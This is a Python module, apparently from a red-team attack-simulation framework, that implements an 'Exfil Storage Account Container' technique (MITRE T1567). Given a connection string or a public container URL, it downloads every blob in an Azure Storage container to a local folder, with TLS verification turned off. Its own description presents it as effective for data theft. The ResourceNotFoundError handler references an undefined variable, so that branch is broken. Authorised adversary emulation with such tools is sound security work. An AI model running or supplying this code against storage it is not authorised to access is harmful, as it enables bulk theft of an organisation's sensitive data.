from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.storage.blob import BlobServiceClient
from azure.core.exceptions import ResourceNotFoundError
from core.azure.azure_access import AzureAccess
from urllib.parse import urlparse
import os
import datetime

@TechniqueRegistry.register
class AzureExfilStorageAccountContainer(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1567",
                technique_name="Exfiltration Over Web Service",
                tactics=["Exfiltration"],
                sub_technique_name= None
            )
        ]
        super().__init__("Exfil Storage Account Container", "Downloads and exfiltrates data from Azure Storage Account containers. The technique can access both public containers using container URLs and private containers using connection strings, making it versatile for different scenarios. It preserves the original blob names and hierarchical directory structure during download, maintaining data organization for later analysis. The technique implements automatic directory creation, error handling for failed downloads, and download tracking to provide accurate metrics. This technique is particularly effective for data theft as Storage Account containers often contain large volumes of business data, backups, application files, and other sensitive organizational assets.", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            is_container_public: bool = kwargs.get("is_container_public", False)
            container_name: str = kwargs["container_name"]
            connection_string: str = kwargs["connection_string"]
            container_url: str = kwargs["container_url"]

            # Input Validation
            if container_name in ["", None]:
                return ExecutionStatus.FAILURE, {
                        "error": "Invalid Technique Input",
                        "message": {"input_required": "Container Name"}
                    }

            if is_container_public in ["", None]:
                is_container_public = False # Set default value
            
            if is_container_public:
                # If container public - check container URL
                if container_url in ["", None]:
                    return ExecutionStatus.FAILURE, {
                        "error": "Invalid Technique Input - Container URL required for public container",
                        "message": {"input_required": "Container URL"}
                    }
            else:
                # If container not public - check connection string
                if connection_string in ["", None]:
                    return ExecutionStatus.FAILURE, {
                        "error": "Invalid Technique Input - Connection String required for private container",
                        "message": {"input_required": "Connection String"}
                    }        

            # Create blob service client
            if connection_string:
                # For private containers use connection string
                blob_service_client = BlobServiceClient.from_connection_string(connection_string, connection_verify=False)
            else:
                # Parse container URL to get account url and container name
                parsed_url = urlparse(container_url)
                account_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                storage_account_name = parsed_url.netloc.split('.')[0]
                container_name = parsed_url.path.strip('/')
                # For public containers use account URL
                blob_service_client = BlobServiceClient(account_url=account_url, connection_verify=False)

            # Get container client
            container_client = blob_service_client.get_container_client(container_name)

            # Create download dir
            if connection_string:
                dt_stamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                download_path = f"./output/azure_sa_container_download/{str(dt_stamp)}"
            else:
                download_path = f"./output/azure_sa_container_download/{storage_account_name}/{container_name}"
                
            os.makedirs(download_path, exist_ok=True)

            # List all blobs in the container
            blob_list = container_client.list_blobs()

            download_success_count = 0
            download_failure_count = 0

            for blob in blob_list:
                # Get blob client for the blob
                blob_client = container_client.get_blob_client(blob.name)
                
                # Construct full path for the downloaded file
                download_file_path = os.path.join(download_path, blob.name)
                
                # Create directories if they don't exist
                os.makedirs(os.path.dirname(download_file_path), exist_ok=True)
                
                # Attempt to download blob from container
                try:
                    with open(download_file_path, "wb") as download_file:
                        download_file.write(blob_client.download_blob().readall())
                    download_success_count +=1 
                except:
                    download_failure_count +=1

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully exfiltrated container {container_name} blobs",
                "value": {
                    "exfil_local_path": download_path,
                    "download_success_count": download_success_count,
                    "download_failure_count": download_failure_count
                }
            }
        except ResourceNotFoundError:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to exfiltrate container {container_name} blobs"
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to exfiltrate container {container_name} blobs"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "is_container_public": {"type": "bool", "required": True, "default": False, "name": "Is Container Public?", "input_field_type" : "bool"},
            "container_name": {"type": "str", "required": True, "default": None, "name": "Container Name", "input_field_type" : "text"},
            "connection_string": {"type": "str", "required": False, "default": None, "name": "Connection String (For Private Container)", "input_field_type" : "text"},
            "container_url": {"type": "str", "required": False, "default": None, "name": "Container URL (For Public Container)", "input_field_type" : "text"}
        }